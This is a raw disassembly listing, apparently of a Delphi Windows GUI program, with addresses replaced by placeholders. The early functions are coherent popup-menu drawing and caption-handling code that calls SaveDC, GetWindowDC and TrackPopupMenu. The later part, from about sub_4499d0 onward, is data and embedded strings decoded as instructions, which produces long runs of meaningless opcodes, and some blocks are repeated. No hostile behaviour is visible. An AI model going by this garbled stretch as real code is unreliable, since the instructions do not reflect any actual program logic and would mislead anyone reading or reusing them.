inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ce98
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_449316
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4492f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41d520
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41d39c
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_449788
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449300
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41d520
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_448ba0
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_4482a0
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4138b8
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_4482a0
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_449459
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ce98
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_449434
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_449417
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_41d520
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41d39c
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44941e
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41d520
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_431cc4
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_455d94
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4138b8
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_4482a0
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4138b8
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_4482a0
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4138b8
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4138b8
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_4482a0
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4138b8
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4138b8
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_4482d0
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4138b8
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4138b8
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_4482d0
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_455a38
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_455aa0
jmp r-xdata
sub_44943b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_4494f4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_41375c
pop esi
pop ebx
retn
push ebx
push sub_448f64
call sub_41a3bc
mov [ ebx + 0x10 ] eax
sub_449538
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4480b8
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_4494f4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_4495ac
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_44951c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_448154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_449604
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_444450
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_448dc0
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_448dc0
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_44964c
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_444450
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4545e4
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403324
mov edx eax
jmp r-xdata
sub_449698
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_41245c
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_449604
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_447a0c
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_447f08
mov eax [ ebx + 0x34 ]
call sub_4452b0
mov eax ebx
call sub_4488b0
mov eax ebx
call sub_44964c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_4453e0
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44974c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4138b8
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4138b8
cmp ebp [ eax ]
jne r-xdata
sub_449788
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41cd48
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41c55c
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41cd48
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41c55c
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403324
mov edx [ r-xdata ]
call sub_4032b4
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41cd48
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41c55c
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_449870
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403ecc
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_404138
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_4043d8
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_404138
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_4043d8
jmp r-xdata
sub_449904
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403e78
mov ebx 0x1
mov eax esi
call sub_404138
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404060
sub_449968
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4499c1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_449870
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_449870
mov eax [ ebp - 0x8 ]
pop edx
call sub_407c54
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4499c8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
sub_4499d0
adc al [ eax ]
add [ eax ] al
xor [ esi + eax * 2 + 0x46aec000 ] ch
add [ esp + ebp * 4 ] ch
inc esi
add [ eax - 0x52 ] bh
inc esi
add [ eax ] ch
lodsb [ esi ]
inc esi
add [ eax ] ch
scasb [ edi ]
inc esi
add [ esp + ebp * 4 ] ah
inc esi
add [ eax - 0x52 ] bl
inc esi
add [ eax ] ah
lodsb [ esi ]
inc esi
add [ eax ] bh
mov cl 0x46
add [ esp + ebp * 4 ] bl
inc esi
add [ eax - 0x52 ] ah
inc esi
add [ eax ] bl
lodsb [ esi ]
inc esi
add ah dl
scasd [ edi ]
inc esi
add [ esp + ebp * 4 ] dl
inc esi
add [ edi + ebp * 4 + 0x46 ] cl
add [ eax ] dl
lodsb [ esi ]
inc esi
add al al
mov cl 0x46
add [ esp + ebp * 4 ] cl
inc esi
add [ ecx + esi * 4 - 0x53f7ffba ] bh
inc esi
add [ eax ] cl
scasd [ edi ]
inc esi
add [ esp + ebp * 4 ] al
inc esi
add [ ecx + esi * 4 + 0x46 ] dh
add [ eax ] al
lodsb [ esi ]
inc esi
add [ eax - 0x4f ] al
inc esi
add ah bh
stosd [ edi ]
inc esi
add [ edx + esi * 4 ] cl
inc esi
add al bh
stosd [ edi ]
inc esi
add ah bl
mov cl 0x46
add ah dh
stosd [ edi ]
inc esi
add [ eax ] bl
scasd [ edi ]
inc esi
add al dh
stosd [ edi ]
inc esi
add [ eax ] ch
scasd [ edi ]
inc esi
add ah ch
stosd [ edi ]
inc esi
add [ edi + ebp * 4 + 0x46 ] ah
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_449ac8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449acf
retn
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_4048f4
mov eax rw-data
call sub_403e78
sub_449ad4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4499d0
call sub_403c24
mov eax [ r-xdata ]
call sub_4130f4
mov eax [ r-xdata ]
call sub_413194
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413140
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413140
mov eax [ r-xdata ]
call sub_413038
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4235c4
mov [ rw-data ] eax
sub_449bc0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x9c
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x3e ] cl
inc ecx
add [ eax + 0x3f ] bl
inc ecx
add [ eax + 0x3f ] ah
inc ecx
add [ eax + ecx * 8 ] dh
inc esp
add [ ecx ] dl
add [ eax ] al
add [ eax + 0x8 ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
add [ 0x6d726f46 ] al
pushfd
inc esp
add ah dl
push ss
inc ecx
add [ 0x6f460500 ] cl
jb r-xdata
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
fwait
inc esp
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
[ eax + ecx * 8 ]
jb r-xdata
shr [ esp + ebx * 4 ] 0x44
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
push [ edi + ecx * 8 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax + edx ] bh
inc eax
add [ eax + eax ] ah
add bh bh
adc al 0xcf
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jae r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
push esp
inc ebx
outsd
outsb
je r-xdata
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
call [ eax - 0x30 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
xchg esp eax
rol [ eax + eax + 0x1 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
iretd
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] sub_41a8c4
sub [ eax ] al
add bh bh
pop eax
iretd
outsd
insb
outsd
jb r-xdata
add [ edi ] al
sub al 0x9c
inc esp
jae r-xdata
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
sahf
inc esp
add [ eax ] cl
ja r-xdata
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
add eax 0x676e6152
add [ gs : eax ] dl
adc [ eax ] al
or al 0x0
add bh bh
mov edi cs
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 4 ] dl
inc esp
add [ eax ] cl
add [ eax ] al
pushad
push ss
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 4 ] ch
pushfd
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi - 0x70f7ffc0 ] al
inc ebx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
add [ eax - 0x4c ] bl
inc ebx
add [ eax - 0x4f ] dh
mov esi 0x86d00043
inc ebx
add [ esi + edi + 0x41 ] dh
dec esi
outsd
jb r-xdata
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
[ eax + edx * 8 + 0x10044 ]
add [ eax ] al
je r-xdata
add [ esi + edi * 4 + 0x43 ] ah
add al dl
xchg [ ebx ] al
je r-xdata
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
call [ eax + edx * 8 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jo r-xdata
add [ esp + ebp * 2 + 0x43 ] ah
add [ eax + eax * 2 + 0x73840043 ] al
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0xd3280041 0x44
js r-xdata
test [ eax + 0x43 ] al
add [ ebx + esi * 2 + 0x499c0043 ] al
inc ebx
add al bh
cdq
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ eax + 0x640044d3 ] ah
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ ebp + ecx * 4 + 0x6ee40043 ] ah
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add [ eax - 0x26 ] bl
inc esp
add [ esp + edx * 8 ] ch
inc esp
add [ eax ] dh
mov [ ebx ] al
fcom st3
inc esp
add [ eax ] bl
test [ ebx ] eax
in al dx
rol [ eax + eax - 0x38 ] cl
mov [ ebx ] al
int3
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
cld
rol [ eax + eax + 0x1 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ esi + ebx * 4 ] dl
inc esp
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
shl [ esi + ebx * 4 + 0x44 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x449f ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x61 ] bh
inc esp
add [ esi + 0x1c00449f ] bl
add al [ eax ]
add [ esp + ecx + 0x43 ] bl
add al ah
cdq
inc ecx
sub_449c80
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
fwait
inc esp
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
[ eax + ecx * 8 ]
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
call [ eax - 0x30 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
xchg esp eax
rol [ eax + eax + 0x1 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
outsb
add [ gs : bx + si ] dl
outsd
insb
outsd
jb r-xdata
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
sahf
inc esp
add [ eax ] cl
ja r-xdata
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
add eax 0x676e6152
add [ gs : eax ] dl
adc [ eax ] al
or al 0x0
add bh bh
mov edi cs
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
add [ ebx + esi - 0x70f7ffc0 ] al
inc ebx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
add [ eax - 0x4c ] bl
inc ebx
add [ eax - 0x4f ] dh
mov esi 0x86d00043
inc ebx
add [ esi + edi + 0x41 ] dh
dec esi
outsd
jb r-xdata
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
[ eax + edx * 8 + 0x10044 ]
add [ eax ] al
je r-xdata
add [ esi + edi * 4 + 0x43 ] ah
add al dl
xchg [ ebx ] al
je r-xdata
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
call [ eax + edx * 8 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
jo r-xdata
add [ esp + ebp * 2 + 0x43 ] ah
add [ eax + eax * 2 + 0x73840043 ] al
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0xd3280041 0x44
js r-xdata
test [ eax + 0x43 ] al
add [ ebx + esi * 2 + 0x499c0043 ] al
inc ebx
add al bh
cdq
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ eax + 0x640044d3 ] ah
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ ebp + ecx * 4 + 0x6ee40043 ] ah
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add [ eax - 0x26 ] bl
inc esp
add [ esp + edx * 8 ] ch
inc esp
add [ eax ] dh
